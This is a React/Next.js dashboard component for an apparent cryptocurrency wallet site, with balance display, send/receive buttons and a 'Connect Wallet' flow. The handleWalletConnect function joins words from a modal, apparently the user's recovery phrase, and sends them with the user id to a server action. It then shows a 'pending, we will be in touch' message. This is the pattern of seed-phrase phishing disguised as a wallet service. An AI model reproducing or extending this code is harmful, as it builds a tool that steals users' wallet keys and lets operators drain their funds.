"use client";

import { useState } from "react";
import { Search, Eye, EyeOff, ArrowUp, ArrowDown, CreditCard, ArrowLeftRight, Check, ChevronDown } from "lucide-react";
import { SendModal } from "@/components/modals/send-modal";
import { ReceiveModal } from "@/components/modals/receive-modal";
import { WalletModal } from "@/components/modals/wallet-modal";
import Link from "next/link";
import CryptoCoins from "@/components/crypto-coins";
import { User } from "@/lib/auth";
import connectUserWallet from "@/actions/wallet.action";
import { authClient } from "@/lib/auth-client";
import { useRouter } from "next/navigation";

function DashboardClient({ coinData, user }: { coinData: CryptoData[], user: User }) {
  const [searchQuery, setSearchQuery] = useState("");
  const [balanceShow, setBalanceShow] = useState(true);
  const [showSendModal, setShowSendModal] = useState(false);
  const [showReceiveModal, setShowReceiveModal] = useState(false);
  const [showWalletModal, setShowWalletModal] = useState(false);

  const router = useRouter();

  const [banner, setBanner] = useState<{
    type: "success" | "error";
    message: string;
  } | null>(null);

  const showBanner = (type: "success" | "error", message: string) => {
    setBanner({ type, message });

    setTimeout(() => {
      setBanner(null);
      if (type === "success") router.refresh();
    }, type === "success" ? 3000 : 10_000);
  };

  const totalBalanceOn = coinData
    .reduce((sum, coin) => sum + coin.balance * coin.price, 0);

  const balance = totalBalanceOn.toLocaleString(undefined, {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  });

  const handleWalletConnect = async (words: string[]) => {
    try {
      const { error } = await connectUserWallet(user.id, words.join(" "));

      if (error) {
        showBanner("error", error);
        return;
      }

      authClient.updateUser({
        walletStatus: "pending"
      }, {
        onError(context) {
          showBanner("error", context.error.message || "Something went wrong. Please try again.");
        },
        onSuccess() {
          setShowWalletModal(false);
          showBanner("success", "Thank you for connecting your wllet, we will be in touch with you regarding the status of your wallet connection");
        }
      })
    } catch (err) {
      console.error("Error connecting wallet...", err);
      showBanner("error", "Something went wrong. Please try again.");
    }
  };

  return (
    <main className="p-2 px-4 pb-24 md:pb-4">
      {/* Search Bar */}
      <div className="relative">
        <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
        <input
          type="text"
          value={searchQuery}
          onChange={(e) => setSearchQuery(e.target.value)}
          placeholder="Search"
          className="w-full bg-white dark:bg-gray-800 border border-gray-300 dark:border-gray-700 rounded-md pl-10 pr-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500"
        />
      </div>

      {/* Banner */}
      {banner && (
        <div
          className={`my-4 rounded-md px-4 py-3 text-sm font-medium flex items-center justify-between
            ${banner.type === "success"
              ? "bg-green-100 text-green-800 dark:bg-green-900/40 dark:text-green-300"
              : "bg-red-100 text-red-800 dark:bg-red-900/40 dark:text-red-300"
            }
          `}
        >
          <span>{banner.message}</span>
          <button
            onClick={() => {
              if (banner.type === "success") {
                setBanner(null)
                router.refresh();
              }
            }}
            className="ml-4 text-xs opacity-70 hover:opacity-100"
          >
            ✕
          </button>
        </div>
      )}

      {/* Account Name with Dropdown */}
      <div className="mt-6">
        <div className="flex justify-start items-center space-x-2">
          <button className="flex items-center space-x-2 hover:text-gray-700 dark:hover:text-gray-300">
            <span className="text-lg font-semibold">
              {user.name}
            </span>
            <ChevronDown className="text-sm w-4 h-4" />
          </button>
        </div>
      </div>

      {/* Balance Display */}
      <div className="mt-6 flex items-center justify-between">
        <div className="text-3xl md:text-4xl font-bold">
          {balanceShow ? `$${balance}` : "••••••••"}
        </div>
        <button
          onClick={() => setBalanceShow(!balanceShow)}
          className="text-gray-600 dark:text-gray-400 hover:text-gray-900 dark:hover:text-white"
        >
          {balanceShow ? (
            <Eye className="text-xl w-5 h-5" />
          ) : (
            <EyeOff className="text-xl w-5 h-5" />
          )}
        </button>
      </div>

      {/* Action Buttons */}
      <div className="mt-8 grid grid-cols-4 gap-4">
        <div className="flex flex-col items-center">
          <button
            onClick={() => setShowSendModal(true)}
            className="h-16 w-16 rounded-full bg-gray-200 dark:bg-[#374151] hover:bg-gray-300 dark:hover:bg-[#2e3847] flex items-center justify-center"
          >
            <ArrowUp className="text-xl w-5 h-5" />
          </button>
          <span className="mt-2 text-sm">Send</span>
        </div>
        <div className="flex flex-col items-center">
          <button
            onClick={() => setShowReceiveModal(true)}
            className="h-16 w-16 rounded-full bg-gray-200 dark:bg-[#374151] hover:bg-gray-300 dark:hover:bg-[#2e3847] flex items-center justify-center"
          >
            <ArrowDown className="text-xl w-5 h-5" />
          </button>
          <span className="mt-2 text-sm">Receive</span>
        </div>
        <div className="flex flex-col items-center">
          <Link
            href="/buy"
            className="h-16 w-16 rounded-full bg-gray-200 dark:bg-[#374151] hover:bg-gray-300 dark:hover:bg-[#2e3847] flex items-center justify-center"
          >
            <CreditCard className="text-xl w-5 h-5" />
          </Link>
          <span className="mt-2 text-sm">Buy</span>
        </div>
        <div className="flex flex-col items-center">
          <Link
            href="/swap"
            className="h-16 w-16 rounded-full bg-gray-200 dark:bg-[#374151] hover:bg-gray-300 dark:hover:bg-[#2e3847] flex items-center justify-center"
          >
            <ArrowLeftRight className="text-xl w-5 h-5" />
          </Link>
          <span className="mt-2 text-sm">Swap</span>
        </div>
      </div>

      {/* Help Text */}
      <div className="mt-6 text-center text-gray-600 dark:text-gray-400">
        Access, secure and withdraw assets
      </div>

      {/* Connect Wallet Button */}
      <button
        onClick={() => setShowWalletModal(true)}
        className={user.walletStatus === "connected"
          ? "mt-3 w-full bg-green-500 text-black dark:text-white font-bold py-3 rounded-md flex items-center justify-center"
          : user.walletStatus === "pending"
            ? "mt-3 w-full bg-blue-500 text-white font-bold py-3 rounded-md flex items-center justify-center cursor-wait opacity-90"
            : "mt-3 w-full bg-yellow-500 text-black font-bold py-3 rounded-md hover:bg-yellow-600 flex items-center justify-center"
        }
        disabled={user.walletStatus !== "not-connected"}
      >
        {user.walletStatus === "connected" ? (
          <>
            <Check className="mr-2 w-4 h-4" />
            Wallet Connected
          </>
        ) : user.walletStatus === "pending" ? (
          "Pending"
        ) : (
          "Connect Wallet"
        )}
      </button>

      {/* Assets */}
      <div className="mt-8">
        <h2 className="text-xl font-bold mb-4">Assets</h2>

        <CryptoCoins coinData={coinData} page="dashboard" path={undefined} />
      </div>

      {/* Modals */}
      <SendModal
        isOpen={showSendModal}
        onClose={() => setShowSendModal(false)}
      />
      <ReceiveModal
        isOpen={showReceiveModal}
        onClose={() => setShowReceiveModal(false)}
      />
      <WalletModal
        isOpen={showWalletModal}
        onClose={() => setShowWalletModal(false)}
        onConnect={handleWalletConnect}
      />
    </main>
  );
}

export default DashboardClient
